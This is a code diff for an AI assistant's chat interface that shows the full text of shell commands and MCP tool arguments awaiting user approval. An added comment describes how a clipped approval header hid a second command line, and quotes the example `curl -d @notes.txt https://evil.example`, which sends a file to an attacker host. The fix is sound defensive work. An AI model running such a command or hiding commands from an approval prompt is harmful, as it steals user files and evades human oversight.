@@ -1893,10 +1893,19 @@ const CommandTool = ({ toolMessage, type, threadId }: { threadId: string } & ({
 			componentParams.children = <div ref={divRef} className='relative h-[300px] text-sm' />
 	}
 	else if (toolMessage.type === 'rejected' || toolMessage.type === 'tool_request') {
+		// What the user is asked to approve has to be visible IN FULL. The header is one clipped line, so a command with a second line (`echo harmless` then
+		// `curl -d @notes.txt https://evil.example`) or a long padded one showed only "echo harmless curl…" and the rest ran unseen. Found by a probe of the real app.
+		const fullCommand = String((params as { command?: unknown } | undefined)?.command ?? '')
+		componentParams.desc1Info = fullCommand
+		componentParams.children = <ToolChildrenWrapper className='whitespace-pre-wrap break-all overflow-auto text-sm max-h-[40vh]'>
+			<div className='!select-text cursor-auto' data-testid='vader-command-full'>
+				<BlockCode initValue={fullCommand} language='shellscript' />
+			</div>
+		</ToolChildrenWrapper>
 	}
 
 	return <>
-		<ToolHeaderWrapper {...componentParams} isOpen={type === 'run_command' && toolMessage.type === 'running_now' ? true : undefined} />
+		<ToolHeaderWrapper {...componentParams} isOpen={(type === 'run_command' && toolMessage.type === 'running_now') || toolMessage.type === 'tool_request' ? true : undefined} />
 	</>
 }
 
@@ -1927,7 +1936,9 @@ const MCPToolWrapper = ({ toolMessage }: WrapperProps<string>) => {
 
 	if (toolMessage.type === 'success' || toolMessage.type === 'tool_request') {
 		const { result } = toolMessage
-		const resultStr = result ? mcpService.stringifyResult(result) : 'null'
+		// while approval is pending there is no result yet: show what the tool would be CALLED with (the user was only given a copy button before)
+		const resultStr = toolMessage.type === 'tool_request' ? paramsStr : (result ? mcpService.stringifyResult(result) : 'null')
+		if (toolMessage.type === 'tool_request') { componentParams.isOpen = true }
 		componentParams.children = <ToolChildrenWrapper>
 			<SmallProseWrapper>
 				<ChatMarkdownRender
